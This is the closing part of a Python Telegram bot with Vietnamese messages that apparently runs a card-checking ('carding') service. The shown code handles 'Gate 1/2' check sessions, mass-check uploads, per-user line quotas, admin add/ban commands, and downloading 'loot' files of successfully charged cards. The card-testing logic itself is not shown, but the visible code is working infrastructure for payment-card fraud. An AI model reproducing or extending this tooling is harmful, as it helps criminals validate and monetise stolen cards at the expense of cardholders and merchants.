                await query.edit_message_text(f"✅ Đã gửi file tổng hợp tất cả thẻ charge từ Gate {gate_num} của user `{target_user_id}`.")
            else:
                await query.edit_message_text(f"ℹ️ User `{target_user_id}` không có thẻ charge nào trên Gate {gate_num}.")

        elif action == "history":
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for ts in sessions:
                summary_path = os.path.join(user_log_dir, ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path, {})
                    counts = summary.get('counts', {})
                    try: readable_ts = datetime.strptime(ts, "%Y%m%d-%H%M%S").strftime("%d/%m/%y %H:%M")
                    except ValueError: readable_ts = ts
                    btn_text = f"🕒 {readable_ts} - ✅{counts.get('success',0)} ❌{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"loot_session_gate{gate_num}_{target_user_id}_{ts}")])
            keyboard.append([InlineKeyboardButton("« Quay lại Menu Chính", callback_data=f"loot_mainmenu_gate{gate_num}_{target_user_id}")])
            await query.edit_message_text(f"📜 Lịch sử check **Gate {gate_num}** của user `{target_user_id}`:", reply_markup=InlineKeyboardMarkup(keyboard))
        
        elif action == "session":
            files = [f for f in os.listdir(os.path.join(user_log_dir, session_ts)) if f.endswith('.txt')]
            keyboard = [[InlineKeyboardButton(f"Tải {f}", callback_data=f"loot_getfile_gate{gate_num}_{target_user_id}_{session_ts}_{f}")] for f in files]
            keyboard.append([InlineKeyboardButton("« Quay lại Lịch Sử", callback_data=f"loot_history_gate{gate_num}_{target_user_id}")])
            await query.edit_message_text(f"Chọn file để tải từ session `{session_ts}`:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif action == "getfile":
            file_path = os.path.join(user_log_dir, session_ts, filename)
            if os.path.exists(file_path):
                await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
                await query.answer(f"Đã gửi file {filename}")
            else:
                await query.answer("❌ Lỗi: Không tìm thấy file.", show_alert=True)

async def add_user(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/add <user_id>`")
        return
    try:
        user_to_add = int(context.args[0])
        users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"ℹ️ User `{user_to_add}` đã có trong danh sách.")
        else:
            users.add(user_to_add)
            save_users(users)
            await update.message.reply_text(f"✅ Đã thêm user `{user_to_add}`.")
    except ValueError:
        await update.message.reply_text("❌ User ID không hợp lệ.")

async def ban_user(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/ban <user_id>`")
        return
    try:
        user_to_ban = int(context.args[0])
        users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban)
            save_users(users)
            # Remove logs from both gates
            for gate_num in [1, 2]:
                user_log_dir = os.path.join(LOG_DIR, f"gate_{gate_num}", str(user_to_ban))
                if os.path.exists(user_log_dir):
                    shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"🗑 Đã xóa user `{user_to_ban}` và toàn bộ log.")
        else:
            await update.message.reply_text(f"ℹ️ Không tìm thấy user `{user_to_ban}`.")
    except ValueError:
        await update.message.reply_text("❌ User ID không hợp lệ.")

async def show_users(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("📭 Danh sách người dùng trống.")
        return
    message_lines = ["👥 **Danh sách ID & Hạn mức:**\n"]
    for user_id in sorted(list(users)):
        limit = get_user_limit(user_id)
        message_lines.append(f"- `{user_id}` | Hạn mức: `{limit}` lines")
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Cú pháp: `/addlimit <user_id> <số_dòng_thêm>`")
        return
    try:
        target_user_id_str, amount_to_add = context.args[0], int(context.args[1])
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError("Dữ liệu không hợp lệ.")
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Dữ liệu không hợp lệ.")
        return
    
    limits = load_json_file(LIMIT_FILE, {})
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    await update.message.reply_text(f"✅ **Cập nhật giới hạn thành công!**\n\n👤 **User ID:** `{target_user_id_str}`\n📈 **Giới hạn cũ:** `{old_limit}`\n➕ **Đã thêm:** `{amount_to_add}`\n📊 **Tổng mới:** `{new_limit}`")

def main():
    """Start the bot."""
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # Lệnh Admin
    application.add_handler(CommandHandler("on", on_command))
    application.add_handler(CommandHandler("off", off_command))
    application.add_handler(CommandHandler("rs", reset_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    
    # Lệnh User
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Khởi tạo file cấu hình nếu chưa có
    load_config()
    
    logger.info(f"Bot đang chạy với Admin ID: {ADMIN_ID}")
    application.run_polling()

if __name__ == '__main__':
    main()
